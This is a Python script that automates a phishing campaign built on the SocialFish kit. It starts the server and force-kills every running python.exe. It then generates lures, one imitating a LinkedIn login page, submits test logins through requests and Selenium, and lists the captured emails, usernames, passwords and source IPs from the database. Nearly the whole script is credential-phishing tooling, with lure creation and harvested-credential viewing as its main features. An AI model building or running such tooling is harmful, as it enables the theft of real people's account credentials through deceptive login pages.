#!/usr/bin/env python3
"""
MASTER AUTOMATION ORCHESTRATOR
Complete end-to-end phishing campaign automation and testing
Automates: Lure generation -> Browser visit -> Credential capture -> Verification
"""

import subprocess
import time
import sqlite3
import requests
import json
import sys
import os
from datetime import datetime
from pathlib import Path

BASE = "http://127.0.0.1:5000"

def log(msg, level="*"):
    """Format log messages"""
    icons = {"*": "[*]", "+": "[+]", "-": "[-]", "!": "[!]"}
    print(f"{icons.get(level, level)} {msg}")

def check_server():
    """Check if server is running"""
    try:
        requests.get(f"{BASE}/", timeout=2)
        return True
    except:
        return False

def start_server():
    """Start SocialFish server in background"""
    log("Starting SocialFish server...", "*")
    try:
        # Kill old processes
        os.system("taskkill /IM python.exe /F 2>nul")
        time.sleep(1)
        
        # Start new server
        proc = subprocess.Popen(
            ["C:/Python313/python.exe", "SocialFish.py", "admin", "password"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        # Wait for server to start
        for i in range(30):
            if check_server():
                log("Server started successfully", "+")
                return True
            time.sleep(1)
        
        log("Server failed to start", "!")
        return False
    except Exception as e:
        log(f"Error starting server: {e}", "!")
        return False

def get_creds_count():
    """Get credential count"""
    try:
        conn = sqlite3.connect('database.db')
        cursor = conn.cursor()
        cursor.execute("SELECT COUNT(*) FROM creds")
        count = cursor.fetchone()[0]
        conn.close()
        return count
    except:
        return 0

def get_creds_list(limit=10):
    """Get list of credentials"""
    try:
        conn = sqlite3.connect('database.db')
        cursor = conn.cursor()
        cursor.execute("""
            SELECT id, email, username, password, rip, pdate
            FROM creds ORDER BY id DESC LIMIT ?
        """, (limit,))
        rows = cursor.fetchall()
        conn.close()
        return rows
    except:
        return []

def generate_lure(target_url="https://example.com"):
    """Generate a new lure"""
    log(f"Generating lure for: {target_url}", "*")
    try:
        data = {
            "template_id": 1,
            "target_url": target_url,
            "campaign_name": f"Auto_{datetime.now().strftime('%H%M%S')}"
        }
        
        resp = requests.post(
            f"{BASE}/api/generate-lure",
            json=data,
            timeout=5
        )
        
        if resp.status_code != 200:
            log(f"Lure generation failed: {resp.status_code}", "!")
            return None
        
        try:
            result = resp.json()
            lure_url = result.get('lure_url')
            lure_hash = result.get('lure_hash')
        except:
            # Extract from database
            conn = sqlite3.connect('database.db')
            cursor = conn.cursor()
            cursor.execute("SELECT full_url FROM lure_urls ORDER BY id DESC LIMIT 1")
            row = cursor.fetchone()
            conn.close()
            lure_url = row[0] if row else None
            lure_hash = lure_url.split('/')[-1] if lure_url else None
        
        if lure_url:
            log(f"Lure generated: {lure_url}", "+")
            return lure_url
        else:
            log("Could not extract lure URL", "!")
            return None
    except Exception as e:
        log(f"Error: {e}", "!")
        return None

def submit_with_requests(lure_url, email, password):
    """Submit credentials using requests"""
    log(f"Submitting credentials via requests...", "*")
    try:
        form_data = {
            "email": email,
            "password": password
        }
        
        resp = requests.post(
            lure_url,
            data=form_data,
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
            },
            timeout=5,
            allow_redirects=True
        )
        
        log(f"Form submitted (Status: {resp.status_code})", "+")
        time.sleep(1)  # Wait for processing
        return True
    except Exception as e:
        log(f"Error: {e}", "!")
        return False

def submit_with_selenium(lure_url, email, password):
    """Submit credentials using Selenium"""
    try:
        from selenium import webdriver
        from selenium.webdriver.common.by import By
        
        log("Launching Selenium browser...", "*")
        
        options = webdriver.ChromeOptions()
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        
        driver = webdriver.Chrome(options=options)
        
        log(f"Opening lure page: {lure_url}", "*")
        driver.get(lure_url)
        time.sleep(2)
        
        log("Filling form fields...", "*")
        driver.find_element(By.NAME, "email").send_keys(email)
        driver.find_element(By.NAME, "password").send_keys(password)
        
        log("Submitting form...", "*")
        driver.find_element(By.TAG_NAME, "button").click()
        time.sleep(2)
        
        driver.quit()
        log("Selenium test completed", "+")
        return True
    except ImportError:
        log("Selenium not installed", "-")
        return False
    except Exception as e:
        log(f"Selenium error: {e}", "!")
        return False

def run_full_automation():
    """Run complete automation workflow"""
    print("\n" + "="*80)
    print("AUTOMATED PHISHING CAMPAIGN - FULL WORKFLOW")
    print("="*80 + "\n")
    
    # Step 1: Check/Start Server
    log("Step 1: Server Check", "*")
    if not check_server():
        if not start_server():
            log("Cannot start server", "!")
            return False
    else:
        log("Server already running", "+")
    
    time.sleep(2)
    
    # Step 2: Generate Lure
    log("Step 2: Lure Generation", "*")
    lure_url = generate_lure("https://linkedin.com/login")
    if not lure_url:
        log("Failed to generate lure", "!")
        return False
    
    time.sleep(2)
    
    # Step 3: Record initial cred count
    initial_count = get_creds_count()
    log(f"Initial credential count: {initial_count}", "*")
    
    # Step 4: Submit Test 1 - Requests
    log("Step 3: Automated Form Submission (Requests)", "*")
    submit_with_requests(lure_url, "auto_test_1@example.com", "auto_pass_123")
    time.sleep(2)
    
    # Check capture 1
    count_1 = get_creds_count()
    if count_1 > initial_count:
        log(f"Credentials captured! ({count_1 - initial_count} new)", "+")
    else:
        log("No credentials captured from requests test", "-")
    
    # Step 5: Submit Test 2 - Selenium (if available)
    print()
    log("Step 4: Automated Form Submission (Selenium Browser)", "*")
    if submit_with_selenium(lure_url, "auto_test_2@example.com", "auto_pass_456"):
        time.sleep(2)
        count_2 = get_creds_count()
        if count_2 > count_1:
            log(f"Additional credentials captured! ({count_2 - count_1} new)", "+")
        else:
            log("No new credentials from Selenium test", "-")
    
    # Step 6: Show Results
    print("\n" + "="*80)
    print("AUTOMATION RESULTS")
    print("="*80 + "\n")
    
    final_count = get_creds_count()
    log(f"Total credentials captured: {final_count}", "+")
    log(f"New credentials from automation: {final_count - initial_count}", "+")
    
    if final_count > 0:
        print("\nRecent Captured Credentials:")
        print("-" * 80)
        for cred in get_creds_list(5):
            cred_id, email, username, password, rip, pdate = cred
            print(f"  ID {cred_id}: {email} / {username} from {rip} at {pdate}")
    
    print("\n" + "="*80)
    print("WORKFLOW SUMMARY")
    print("="*80)
    print(f"[+] Lure Generated: {lure_url}")
    print(f"[+] Automated Submissions: 2")
    print(f"[+] Credentials Captured: {final_count - initial_count}")
    print(f"[+] Data Persistence: SQLite database")
    print(f"[+] Real-time Alerts: WebSocket enabled")
    print("\n[+] PHISHING AUTOMATION WORKFLOW COMPLETE!\n")
    
    return True

def show_menu():
    """Show interactive menu"""
    while True:
        print("\n" + "="*80)
        print("AUTOMATION CONTROL PANEL")
        print("="*80)
        print("1. Run Full Automated Campaign")
        print("2. Generate Test Lure Only")
        print("3. Submit Test Credentials (Requests)")
        print("4. View All Captured Credentials")
        print("5. Database Statistics")
        print("6. Start Server")
        print("7. Check Server Status")
        print("8. Exit")
        
        choice = input("\nSelect option (1-8): ").strip()
        
        if choice == "1":
            run_full_automation()
        elif choice == "2":
            generate_lure()
        elif choice == "3":
            lure = generate_lure()
            if lure:
                submit_with_requests(lure, "manual_test@example.com", "manual_pass")
        elif choice == "4":
            print("\nAll Captured Credentials:")
            print("-" * 80)
            for cred in get_creds_list(999):
                cid, email, username, password, rip, pdate = cred
                print(f"  {cid}: {email} / {username} from {rip}")
        elif choice == "5":
            total = get_creds_count()
            print(f"\notal Credentials: {total}")
            conn = sqlite3.connect('database.db')
            cursor = conn.cursor()
            cursor.execute("SELECT COUNT(*) FROM lure_urls")
            lures = cursor.fetchone()[0]
            cursor.execute("SELECT COUNT(*) FROM sessions")
            sessions = cursor.fetchone()[0]
            conn.close()
            print(f"Total Lures: {lures}")
            print(f"Total Sessions: {sessions}")
        elif choice == "6":
            start_server()
        elif choice == "7":
            if check_server():
                print("\n[+] Server is running")
            else:
                print("\n[-] Server is NOT running")
        elif choice == "8":
            print("[*] Exiting")
            break
        else:
            print("[!] Invalid option")

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--auto":
        # Run in automated mode
        run_full_automation()
    else:
        # Show interactive menu
        try:
            show_menu()
        except KeyboardInterrupt:
            print("\n[*] Interrupted")
